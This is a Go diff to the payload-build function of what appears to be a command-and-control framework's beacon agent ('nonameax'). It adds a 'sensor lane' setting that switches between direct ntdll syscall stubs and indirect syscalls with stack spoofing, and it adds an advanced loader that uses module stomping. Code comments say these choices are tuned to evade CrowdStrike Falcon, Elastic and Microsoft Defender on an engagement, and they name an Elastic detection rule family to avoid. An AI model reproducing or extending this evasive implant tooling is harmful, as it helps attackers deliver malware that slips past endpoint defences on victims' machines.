@@ -179,7 +179,9 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	}
 
 	stompAdvanced := false
-	if v, ok := agentCfg["stomp_advanced"].(string); ok {
+	if v, ok := agentCfg["stomp_advanced"].(bool); ok {
+		stompAdvanced = v
+	} else if v, ok := agentCfg["stomp_advanced"].(string); ok {
 		stompAdvanced = strings.ToLower(v) != "basic (loadlibraryex)"
 	}
 
@@ -444,12 +446,52 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		execMode = "0"
 	}
 
+	// Sensor lane (elastic = direct ntdll stubs; defender = indirect syscalls
+	// + stack spoof) - see src_beacon/Makefile. Defaults to elastic: Falcon +
+	// Elastic are the primary sensors this engagement, and on the elastic
+	// lane the indirect stubs are pure downside (image_indirect_call trips
+	// Elastic's e7d63d66 rule family).
+	lane := "elastic"
+	if v, ok := agentCfg["lane"].(string); ok && v != "" {
+		// the axs passes the combo LABEL; match on it like stomp_advanced does
+		if strings.Contains(strings.ToLower(v), "defender") {
+			lane = "defender"
+		} else {
+			lane = "elastic"
+		}
+	}
+
+	// Lane changes the beacon's compile-time stubs: on lane switch, wipe the
+	// beacon build dir so the next make does a full rebuild (the lane is not
+	// part of Config.h timestamps, which normally gate beacon recompiles).
+	laneSentinel := filepath.Join(buildDir, ".nax_lane")
+	if prev, err := os.ReadFile(laneSentinel); err == nil && strings.TrimSpace(string(prev)) != lane {
+		buildLog(1, "Lane changed (%s -> %s) - wiping beacon build dir for full rebuild", strings.TrimSpace(string(prev)), lane)
+		os.RemoveAll(buildDir)
+	}
+	os.MkdirAll(buildDir, 0755)
+	os.WriteFile(laneSentinel, []byte(lane), 0644)
+
+	// Advanced loader selection: src_loader_adv (indirect syscalls +
+	// already-loaded-module stomp). Map stomp modes: the adv loader has no
+	// LoadLibraryExW mode (1) - module stomp there is already-loaded (2).
+	loaderDir := "src_loader"
+	loaderBin := "nax_loader.x64.bin"
+	advStompMode := stompMode
+	if stompAdv == "1" {
+		loaderDir = "src_loader_adv"
+		loaderBin = "nax_adv_loader.x64.bin"
+		if moduleStomp {
+			advStompMode = "2"
+		}
+	}
+
 	// Only rebuild loader when technique defines change - compare against
 	// a sentinel file. Otherwise reuse cached .o files for fast re-link.
 	// Transport profile is NOT included — the loader doesn't use it.
-	loaderObjDir := filepath.Join(naxRoot, "src_loader", "bin", "obj")
+	loaderObjDir := filepath.Join(naxRoot, loaderDir, "bin", "obj")
 	sentinel := filepath.Join(loaderObjDir, ".nax_defines")
-	currentDefines := stompMode + ":" + execMode + ":" + stompAdv
+	currentDefines := advStompMode + ":" + execMode
 	if prev, err := os.ReadFile(sentinel); err != nil || strings.TrimSpace(string(prev)) != currentDefines {
 		buildLog(1, "Loader defines changed - rebuilding")
 		os.RemoveAll(loaderObjDir)
@@ -462,6 +504,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		"NAX_EXEC_MODE=" + execMode,
 		"NAX_STOMP_ADVANCED=" + stompAdv,
 		"NAX_TRANSPORT_PROFILE=" + strconv.Itoa(transportProfile),
+		"NAX_LANE=" + lane,
 	}
 	buildLog(1, "Compiling: make %s", strings.Join(makeArgs[1:], " "))
 	buildCmd := exec.Command("make", makeArgs...)
@@ -494,8 +537,38 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		return nil, "", fmt.Errorf("nonameax: BuildPayload: make %s failed: %v", target, buildErr)
 	}
 
+	/* ========= [ advanced loader build ] =========
+	 * The root make (above) syncs the beacon + plain loader; when the
+	 * advanced loader is selected, build it from its own Makefile now. */
+	if loaderDir == "src_loader_adv" {
+		advArgs := []string{"-C", filepath.Join(naxRoot, "src_loader_adv"),
+			"NAX_STOMP_MODE=" + advStompMode,
+			"NAX_EXEC_MODE=" + execMode,
+		}
+		buildLog(1, "Compiling advanced loader: make %s", strings.Join(advArgs[1:], " "))
+		advCmd := exec.Command("make", advArgs...)
+		advOut, advErr := advCmd.CombinedOutput()
+		for _, line := range strings.Split(string(advOut), "\n") {
+			line = strings.TrimSpace(line)
+			if line == "" || strings.HasPrefix(line, "BIN ") ||
+				strings.HasPrefix(line, "loader ") || strings.HasPrefix(line, "hdr ") ||
+				strings.HasPrefix(line, "beacon ") {
+				continue
+			}
+			if strings.HasPrefix(line, "[+]") {
+				buildLog(3, "%s", strings.TrimPrefix(line, "[+] "))
+			} else if strings.HasPrefix(line, "Error") {
+				buildLog(2, "%s", strings.TrimPrefix(line, "[-] "))
+			}
+		}
+		if advErr != nil {
+			buildLog(2, "Advanced loader build failed: %v", advErr)
+			return nil, "", fmt.Errorf("nonameax: BuildPayload: advanced loader build failed: %v", advErr)
+		}
+	}
+
 	/* ========= [ read component binaries ] ========= */
-	loaderPath := filepath.Join(naxRoot, "src_loader", "bin", "nax_loader.x64.bin")
+	loaderPath := filepath.Join(naxRoot, loaderDir, "bin", loaderBin)
 	var beaconPath, pdataPath, xdataPath, rvaPath string
 	if debug {
 		beaconPath = filepath.Join(buildDir, "beacon.x64.debug.bin")
